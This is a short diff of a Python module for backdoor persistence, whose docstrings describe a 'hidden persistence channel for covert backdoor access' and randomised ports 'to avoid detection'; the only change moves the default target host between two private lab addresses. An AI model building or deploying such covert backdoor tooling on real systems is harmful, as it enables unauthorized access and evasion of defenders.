@@ -12,7 +12,7 @@ import os
 class HiddenChannel:
     """Hidden persistence channel for covert backdoor access"""
 
-    def __init__(self, listen_port=None, target_host='192.168.56.106', target_port=5555):
+    def __init__(self, listen_port=None, target_host='192.168.56.104', target_port=5555):
         # Use random port if not specified to avoid detection
         self.listen_port = listen_port or random.randint(8000, 9999)
         self.target_host = target_host
@@ -312,7 +312,7 @@ class PersistenceManager:
 class BackdoorPersistence:
     """Main manager for backdoor persistence operations"""
     
-    def __init__(self, target_host='192.168.56.106', target_port=5555):
+    def __init__(self, target_host='192.168.56.104', target_port=5555):
         self.target_host = target_host
         self.target_port = target_port
         self.channel = None
@@ -382,7 +382,7 @@ class BackdoorPersistence:
 
 
 # Factory function to create backdoor persistence manager
-def create_backdoor_persistence(target_host='192.168.56.106', target_port=5555):
+def create_backdoor_persistence(target_host='192.168.56.104', target_port=5555):
     """Create backdoor persistence manager instance"""
     return BackdoorPersistence(target_host, target_port)
 
